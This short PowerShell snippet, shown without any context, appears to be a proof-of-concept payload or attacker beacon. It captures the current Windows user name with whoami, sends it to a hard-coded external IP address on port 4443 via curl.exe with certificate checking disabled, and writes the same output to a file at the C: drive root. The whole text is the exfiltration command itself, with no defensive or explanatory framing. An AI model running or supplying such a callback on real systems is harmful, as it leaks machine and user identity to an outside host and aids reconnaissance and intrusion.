$user = [uri]::EscapeDataString((whoami))
curl.exe "https://206.189.113.121:4443/ASD/$user" -k
whoami | Out-File C:\\result.txt
